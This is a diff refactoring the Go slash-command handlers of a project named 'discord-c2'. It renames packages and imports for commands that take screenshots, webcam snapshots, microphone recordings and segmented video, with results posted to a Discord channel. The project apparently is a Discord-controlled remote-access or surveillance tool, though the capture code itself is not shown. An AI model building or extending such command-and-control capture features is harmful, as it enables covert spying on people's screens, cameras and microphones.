@@ -1,4 +1,4 @@
-package main
+package commands
 
 // This file contains media-related slash commands such as screenshot, camera,
 // microphone recording, and segmented video recording.
@@ -9,7 +9,7 @@ import (
 	"os"
 	"strings"
 
-	"discord-c2/actions"
+	"discord-c2/internal/media"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -24,7 +24,7 @@ func handleSlashScreenshot(s *discordgo.Session, i *discordgo.InteractionCreate)
 			Flags:   discordgo.MessageFlagsEphemeral,
 		},
 	})
-	actions.Screenshot(s, i.ChannelID, nil)
+	media.Screenshot(s, i.ChannelID, nil)
 }
 
 // handleSlashCamera triggers a single still image capture from the configured
@@ -37,7 +37,7 @@ func handleSlashCamera(s *discordgo.Session, i *discordgo.InteractionCreate) {
 			Flags:   discordgo.MessageFlagsEphemeral,
 		},
 	})
-	actions.CameraSnapshot(s, i.ChannelID, nil)
+	media.CameraSnapshot(s, i.ChannelID, nil)
 }
 
 // handleSlashMic records audio from the microphone for the requested duration
@@ -75,7 +75,7 @@ func handleSlashMic(s *discordgo.Session, i *discordgo.InteractionCreate, data d
 		},
 	})
 	log.Printf("MIC starting MicRecord: channel=%s", i.ChannelID)
-	actions.MicRecord(s, i.ChannelID, nil, int(seconds), path)
+	media.MicRecord(s, i.ChannelID, nil, int(seconds), path)
 	log.Printf("MIC MicRecord returned: channel=%s", i.ChannelID)
 }
 
@@ -177,7 +177,7 @@ func handleSlashRecord(s *discordgo.Session, i *discordgo.InteractionCreate, dat
 			Flags: discordgo.MessageFlagsEphemeral,
 		},
 	})
-	go actions.VideoRecord(s, i.ChannelID, nil, source, int(maxSizeMB), int(maxParts), int(totalSeconds), quality)
+	go media.VideoRecord(s, i.ChannelID, nil, source, int(maxSizeMB), int(maxParts), int(totalSeconds), quality)
 }
 
 // handleSlashRecordStop asks the background recording goroutine to stop the
@@ -190,5 +190,5 @@ func handleSlashRecordStop(s *discordgo.Session, i *discordgo.InteractionCreate)
 			Flags:   discordgo.MessageFlagsEphemeral,
 		},
 	})
-	go actions.VideoStop(s, i.ChannelID, nil)
+	go media.VideoStop(s, i.ChannelID, nil)
 }
